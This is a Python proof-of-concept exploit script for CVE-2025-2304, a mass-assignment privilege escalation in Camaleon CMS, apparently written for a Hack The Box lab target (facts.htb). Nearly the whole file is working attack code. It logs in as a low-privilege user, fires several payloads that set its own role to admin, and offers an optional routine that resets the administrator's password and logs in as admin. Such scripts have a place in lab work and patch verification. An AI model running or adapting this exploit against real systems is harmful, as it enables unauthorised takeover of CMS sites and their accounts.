#!/usr/bin/env python3
"""
CVE-2025-2304 PoC - Camaleon CMS Mass Assignment Privilege Escalation
Simplified version for testing with existing user credentials
"""

import requests
import re
import sys
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import random
import string
import time

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.BLUE}{'='*60}
   CVE-2025-2304 - Camaleon CMS Privilege Escalation PoC
   Pre-Registered User Version
{'='*60}{Colors.END}
    """
    print(banner)

def get_csrf_token(session, url):
    """Extract CSRF token from a page"""
    try:
        r = session.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find('meta', {'name': 'csrf-token'})
        if csrf:
            return csrf.get('content')
        # Try form-based CSRF
        token = soup.find('input', {'name': 'authenticity_token'})
        if token:
            return token.get('value')
    except Exception as e:
        print(f"{Colors.RED}[-] Error getting CSRF token: {e}{Colors.END}")
    return None

def login_user(session, base_url, username, password):
    """Login with existing credentials"""
    print(f"{Colors.BLUE}[*] Logging in as {username}...{Colors.END}")
    
    login_url = urljoin(base_url, '/admin/login')
    
    csrf_token = get_csrf_token(session, login_url)
    if not csrf_token:
        print(f"{Colors.RED}[-] Failed to get CSRF token for login{Colors.END}")
        return False
    
    data = {
        'authenticity_token': csrf_token,
        'user[username]': username,
        'user[password]': password,
    }
    
    try:
        r = session.post(login_url, data=data, allow_redirects=True, timeout=10)
        
        if 'dashboard' in r.url or 'profile' in r.url:
            print(f"{Colors.GREEN}[+] Successfully logged in{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}[-] Login failed{Colors.END}")
            if 'error' in r.text.lower():
                print(f"{Colors.RED}[-] Possible invalid credentials{Colors.END}")
            return False
    except Exception as e:
        print(f"{Colors.RED}[-] Login error: {e}{Colors.END}")
        return False

def check_version(session, base_url):
    """Check Camaleon CMS version"""
    print(f"\n{Colors.BLUE}[*] Checking CMS version...{Colors.END}")
    
    try:
        profile_url = urljoin(base_url, '/admin/profile/edit')
        r = session.get(profile_url, timeout=10)
        
        # Look for version in HTML
        version_match = re.search(r'<b>Version\s*</b>\s*([\d.]+)', r.text)
        if version_match:
            version = version_match.group(1)
            print(f"{Colors.YELLOW}[*] Detected version: {version}{Colors.END}")
            
            # Check if vulnerable
            major, minor, patch = map(int, version.split('.'))
            if (major == 2 and minor == 9 and patch == 0) or (major == 2 and minor < 9):
                print(f"{Colors.GREEN}[+] Version is VULNERABLE (< 2.9.1){Colors.END}")
                return version, True
            else:
                print(f"{Colors.YELLOW}[!] Version {version} should be patched (>= 2.9.1){Colors.END}")
                print(f"{Colors.YELLOW}[!] Testing anyway...{Colors.END}")
                return version, False
        else:
            print(f"{Colors.YELLOW}[!] Could not determine version, proceeding anyway...{Colors.END}")
            return "Unknown", True
    except Exception as e:
        print(f"{Colors.RED}[-] Error checking version: {e}{Colors.END}")
        return "Unknown", True

def get_user_info(session, base_url):
    """Extract user ID and current role"""
    try:
        profile_url = urljoin(base_url, '/admin/profile/edit')
        r = session.get(profile_url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Get user ID
        user_id = None
        id_match = re.search(r'/admin/users/(\d+)', r.text)
        if id_match:
            user_id = id_match.group(1)
        else:
            user_id_input = soup.find('input', {'name': 'user[id]'})
            if user_id_input:
                user_id = user_id_input.get('value')
        
        # Get username
        username = None
        username_input = soup.find('input', {'name': 'user[username]'})
        if username_input:
            username = username_input.get('value')
        
        # Get role
        role = None
        role_name = None
        role_select = soup.find('select', {'name': 'user[role]'})
        if role_select:
            selected = role_select.find('option', {'selected': True})
            if selected:
                role = selected.get('value')
                role_name = selected.text.strip()
        
        return user_id, username, role, role_name
        
    except Exception as e:
        print(f"{Colors.RED}[-] Error getting user info: {e}{Colors.END}")
        return None, None, None, None

def exploit_mass_assignment(session, base_url, user_id, user_password, verbose=False):
    """Attempt privilege escalation via mass assignment"""
    print(f"\n{Colors.BLUE}{'='*60}")
    print(f"[*] Testing CVE-2025-2304 Mass Assignment Vulnerability")
    print(f"{'='*60}{Colors.END}\n")
    
    # Check initial role
    _, username, initial_role, initial_role_name = get_user_info(session, base_url)
    
    print(f"{Colors.YELLOW}[*] Target User: {username} (ID: {user_id}){Colors.END}")
    print(f"{Colors.YELLOW}[*] Current Role: {initial_role_name} ({initial_role}){Colors.END}")
    print(f"{Colors.GREEN}[*] Password will remain unchanged{Colors.END}\n")
    
    if initial_role == 'admin':
        print(f"{Colors.GREEN}[+] User already has admin privileges!{Colors.END}")
        return True
    
    # Get fresh CSRF token
    csrf_token = get_csrf_token(session, urljoin(base_url, '/admin/profile/edit'))
    
    # Define exploit payloads to test
    exploit_tests = [
        {
            'name': 'AJAX endpoint - user[role]',
            'url': f'/admin/users/{user_id}/updated_ajax',
            'payload': {'user[role]': 'admin'},
            'headers': {'X-Requested-With': 'XMLHttpRequest'}
        },
        {
            'name': 'AJAX endpoint - password[role]',
            'url': f'/admin/users/{user_id}/updated_ajax',
            'payload': {'password[role]': 'admin'},
            'headers': {'X-Requested-With': 'XMLHttpRequest'}
        },
        {
            'name': 'AJAX endpoint - role (top-level)',
            'url': f'/admin/users/{user_id}/updated_ajax',
            'payload': {'role': 'admin'},
            'headers': {'X-Requested-With': 'XMLHttpRequest'}
        },
        {
            'name': 'AJAX endpoint - user[admin] flag',
            'url': f'/admin/users/{user_id}/updated_ajax',
            'payload': {'user[admin]': '1', 'user[role]': 'admin'},
            'headers': {'X-Requested-With': 'XMLHttpRequest'}
        },
        {
            'name': 'AJAX endpoint - combined with user attributes',
            'url': f'/admin/users/{user_id}/updated_ajax',
            'payload': {
                'user[role]': 'admin',
                'user[username]': username,
            },
            'headers': {'X-Requested-With': 'XMLHttpRequest'}
        },
        {
            'name': 'Main endpoint - user[role]',
            'url': f'/admin/users/{user_id}',
            'payload': {'user[role]': 'admin'},
            'headers': {}
        },
        {
            'name': 'Main endpoint - combined attributes',
            'url': f'/admin/users/{user_id}',
            'payload': {
                'user[role]': 'admin',
                'user[username]': username,
            },
            'headers': {}
        },
    ]
    
    for i, test in enumerate(exploit_tests, 1):
        print(f"{Colors.BLUE}[{i}/{len(exploit_tests)}] Testing: {test['name']}{Colors.END}")
        
        url = urljoin(base_url, test['url'])
        
        # Build request data - KEEP ORIGINAL PASSWORD
        data = {
            '_method': 'patch',
            'authenticity_token': csrf_token,
            'password[password]': user_password,  # Use original password
            'password[password_confirmation]': user_password,  # Use original password
            **test['payload']
        }
        
        headers = {
            'X-CSRF-Token': csrf_token,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            **test['headers']
        }
        
        try:
            r = session.post(url, data=data, headers=headers, timeout=10, allow_redirects=False)
            
            if verbose:
                print(f"    Status: {r.status_code}")
                print(f"    Payload: {test['payload']}")
            
            # Wait for changes to propagate
            time.sleep(0.5)
            
            # Check if role changed
            _, _, new_role, new_role_name = get_user_info(session, base_url)
            
            if new_role == 'admin':
                print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
                print(f"[+] EXPLOITATION SUCCESSFUL!")
                print(f"{'='*60}{Colors.END}")
                print(f"{Colors.GREEN}[+] Privilege Escalation: {initial_role_name} → {new_role_name}{Colors.END}")
                print(f"{Colors.GREEN}[+] Vulnerable Endpoint: {test['url']}{Colors.END}")
                print(f"{Colors.GREEN}[+] Working Payload: {test['payload']}{Colors.END}")
                print(f"{Colors.GREEN}[+] Password Unchanged: User can still login normally{Colors.END}")
                print(f"{Colors.GREEN}[+] CVE-2025-2304 CONFIRMED!{Colors.END}\n")
                return True
            else:
                if verbose:
                    print(f"    Result: Role unchanged ({new_role})\n")
                else:
                    print(f"    {Colors.RED}✗ Failed{Colors.END}")
                
        except Exception as e:
            print(f"    {Colors.RED}Error: {e}{Colors.END}")
    
    print(f"\n{Colors.RED}[-] All mass assignment attempts failed{Colors.END}")
    return False

def exploit_without_password_change(session, base_url, user_id, verbose=False):
    """Attempt privilege escalation WITHOUT password change fields"""
    print(f"\n{Colors.BLUE}{'='*60}")
    print(f"[*] Testing Mass Assignment WITHOUT Password Fields")
    print(f"{'='*60}{Colors.END}\n")
    
    # Check initial role
    _, username, initial_role, initial_role_name = get_user_info(session, base_url)
    
    print(f"{Colors.YELLOW}[*] Testing without password fields (safer approach){Colors.END}\n")
    
    if initial_role == 'admin':
        return True
    
    # Get fresh CSRF token
    csrf_token = get_csrf_token(session, urljoin(base_url, '/admin/profile/edit'))
    
    # Test payloads WITHOUT password fields
    exploit_tests = [
        {
            'name': 'Main endpoint - user[role] only',
            'url': f'/admin/users/{user_id}',
            'payload': {'user[role]': 'admin'},
        },
        {
            'name': 'Main endpoint - user[role] + username',
            'url': f'/admin/users/{user_id}',
            'payload': {
                'user[role]': 'admin',
                'user[username]': username,
            },
        },
        {
            'name': 'Main endpoint - full profile with role',
            'url': f'/admin/users/{user_id}',
            'payload': {
                'user[role]': 'admin',
                'user[username]': username,
                'user[first_name]': 'Test',
                'user[last_name]': 'User',
            },
        },
    ]
    
    for i, test in enumerate(exploit_tests, 1):
        print(f"{Colors.BLUE}[{i}/{len(exploit_tests)}] Testing: {test['name']}{Colors.END}")
        
        url = urljoin(base_url, test['url'])
        
        # Build request data WITHOUT password fields
        data = {
            '_method': 'patch',
            'authenticity_token': csrf_token,
            **test['payload']
        }
        
        headers = {
            'X-CSRF-Token': csrf_token,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        
        try:
            r = session.post(url, data=data, headers=headers, timeout=10, allow_redirects=False)
            
            if verbose:
                print(f"    Status: {r.status_code}")
            
            time.sleep(0.5)
            
            # Check if role changed
            _, _, new_role, new_role_name = get_user_info(session, base_url)
            
            if new_role == 'admin':
                print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
                print(f"[+] EXPLOITATION SUCCESSFUL!")
                print(f"{'='*60}{Colors.END}")
                print(f"{Colors.GREEN}[+] Privilege Escalation: {initial_role_name} → {new_role_name}{Colors.END}")
                print(f"{Colors.GREEN}[+] Vulnerable Endpoint: {test['url']}{Colors.END}")
                print(f"{Colors.GREEN}[+] Working Payload: {test['payload']}{Colors.END}")
                print(f"{Colors.GREEN}[+] No Password Change: Completely safe for user{Colors.END}")
                print(f"{Colors.GREEN}[+] CVE-2025-2304 CONFIRMED!{Colors.END}\n")
                return True
            else:
                print(f"    {Colors.RED}✗ Failed{Colors.END}")
                
        except Exception as e:
            print(f"    {Colors.RED}Error: {e}{Colors.END}")
    
    return False

def exploit_admin_takeover(session, base_url, verbose=False):
    """Attempt to change admin user's password"""
    print(f"\n{Colors.BLUE}{'='*60}")
    print(f"[*] Testing Admin Password Reset Attack")
    print(f"{Colors.YELLOW}[!] WARNING: This will change admin password if successful{Colors.END}")
    print(f"{'='*60}{Colors.END}\n")
    
    admin_id = 1
    new_password = 'Pwned' + ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '!123'
    
    csrf_token = get_csrf_token(session, urljoin(base_url, '/admin/profile/edit'))
    
    test_endpoints = [
        {
            'name': 'AJAX password update',
            'url': f'/admin/users/{admin_id}/updated_ajax',
            'headers': {'X-Requested-With': 'XMLHttpRequest'}
        },
        {
            'name': 'Main profile update',
            'url': f'/admin/users/{admin_id}',
            'headers': {}
        },
    ]
    
    for i, test in enumerate(test_endpoints, 1):
        print(f"{Colors.BLUE}[{i}/{len(test_endpoints)}] Testing: {test['name']}{Colors.END}")
        
        url = urljoin(base_url, test['url'])
        
        data = {
            '_method': 'patch',
            'authenticity_token': csrf_token,
            'password[password]': new_password,
            'password[password_confirmation]': new_password,
        }
        
        headers = {
            'X-CSRF-Token': csrf_token,
            **test['headers']
        }
        
        try:
            r = session.post(url, data=data, headers=headers, allow_redirects=False, timeout=10)
            
            if verbose:
                print(f"    Status: {r.status_code}")
            
            # Try to login as admin
            if try_admin_login(session, base_url, new_password):
                print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
                print(f"[+] ADMIN TAKEOVER SUCCESSFUL!")
                print(f"{'='*60}{Colors.END}")
                print(f"{Colors.GREEN}[+] Admin password changed successfully{Colors.END}")
                print(f"{Colors.GREEN}[+] New password: {new_password}{Colors.END}")
                print(f"{Colors.GREEN}[+] CVE-2025-2304 CONFIRMED!{Colors.END}\n")
                return True
            else:
                print(f"    {Colors.RED}✗ Failed{Colors.END}")
                
        except Exception as e:
            print(f"    {Colors.RED}Error: {e}{Colors.END}")
    
    print(f"\n{Colors.RED}[-] Admin password reset failed{Colors.END}")
    return False

def try_admin_login(original_session, base_url, password):
    """Try to login as admin with new password"""
    test_session = requests.Session()
    test_session.verify = False
    
    # Copy proxy settings if any
    if hasattr(original_session, 'proxies'):
        test_session.proxies = original_session.proxies
    
    login_url = urljoin(base_url, '/admin/login')
    csrf_token = get_csrf_token(test_session, login_url)
    
    if not csrf_token:
        return False
    
    data = {
        'authenticity_token': csrf_token,
        'user[username]': 'admin',
        'user[password]': password,
    }
    
    try:
        r = test_session.post(login_url, data=data, allow_redirects=True, timeout=10)
        
        if 'dashboard' in r.url and 'error' not in r.text.lower():
            # Verify admin role
            _, _, role, _ = get_user_info(test_session, base_url)
            return role == 'admin'
    except:
        pass
    
    return False

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='CVE-2025-2304 PoC - Test with existing user credentials',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  {sys.argv[0]} http://facts.htb -u testuser -p password123
  {sys.argv[0]} http://facts.htb -u testuser -p password123 --proxy http://127.0.0.1:8080
  {sys.argv[0]} http://facts.htb -u testuser -p password123 --verbose
  {sys.argv[0]} http://facts.htb -u testuser -p password123 --no-password-field
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., http://facts.htb)')
    parser.add_argument('-u', '--username', required=True, help='Existing username')
    parser.add_argument('-p', '--password', required=True, help='User password')
    parser.add_argument('--proxy', help='HTTP proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--skip-admin-test', action='store_true', help='Skip admin password reset test')
    parser.add_argument('--no-password-field', action='store_true', help='Try exploitation without password fields first')
    
    args = parser.parse_args()
    
    base_url = args.target.rstrip('/')
    
    print(f"{Colors.YELLOW}[*] Target: {base_url}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Username: {args.username}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Password: {'*' * len(args.password)}{Colors.END}")
    
    # Setup session
    session = requests.Session()
    session.verify = False
    requests.packages.urllib3.disable_warnings()
    
    if args.proxy:
        session.proxies = {'http': args.proxy, 'https': args.proxy}
        print(f"{Colors.YELLOW}[*] Proxy: {args.proxy}{Colors.END}")
    
    print()
    
    # Login
    if not login_user(session, base_url, args.username, args.password):
        print(f"\n{Colors.RED}[!] Failed to login. Check credentials and try again.{Colors.END}")
        sys.exit(1)
    
    # Check version
    version, potentially_vuln = check_version(session, base_url)
    
    # Get user info
    user_id, username, role, role_name = get_user_info(session, base_url)
    
    if not user_id:
        print(f"{Colors.RED}[-] Could not determine user ID{Colors.END}")
        sys.exit(1)
    
    success = False
    
    # Try without password fields first if requested
    if args.no_password_field:
        success = exploit_without_password_change(session, base_url, user_id, verbose=args.verbose)
        if success:
            print(f"{Colors.GREEN}{Colors.BOLD}[✓] CVE-2025-2304 VULNERABILITY CONFIRMED{Colors.END}\n")
            sys.exit(0)
    
    # Test mass assignment with password preservation
    success = exploit_mass_assignment(session, base_url, user_id, args.password, verbose=args.verbose)
    
    if success:
        print(f"{Colors.GREEN}{Colors.BOLD}[✓] CVE-2025-2304 VULNERABILITY CONFIRMED{Colors.END}\n")
        sys.exit(0)
    
    # Test admin takeover (if not skipped)
    if not args.skip_admin_test:
        print(f"\n{Colors.YELLOW}[!] Attempting admin password reset (destructive test)...{Colors.END}")
        confirm = input(f"{Colors.YELLOW}Continue? [y/N]: {Colors.END}").strip().lower()
        
        if confirm == 'y':
            success = exploit_admin_takeover(session, base_url, verbose=args.verbose)
            
            if success:
                print(f"{Colors.GREEN}{Colors.BOLD}[✓] CVE-2025-2304 VULNERABILITY CONFIRMED{Colors.END}\n")
                sys.exit(0)
    
    # No vulnerabilities found
    print(f"\n{Colors.RED}{Colors.BOLD}{'='*60}")
    print(f"[✗] VULNERABILITY NOT EXPLOITABLE")
    print(f"{'='*60}{Colors.END}")
    print(f"{Colors.RED}[-] All exploitation attempts failed{Colors.END}")
    print(f"{Colors.YELLOW}[*] Possible reasons:{Colors.END}")
    print(f"    - Target is patched (version >= 2.9.1)")
    print(f"    - Strong parameter filtering is in place")
    print(f"    - Custom security controls implemented")
    print()
    
    sys.exit(1)

if __name__ == '__main__':
    main()
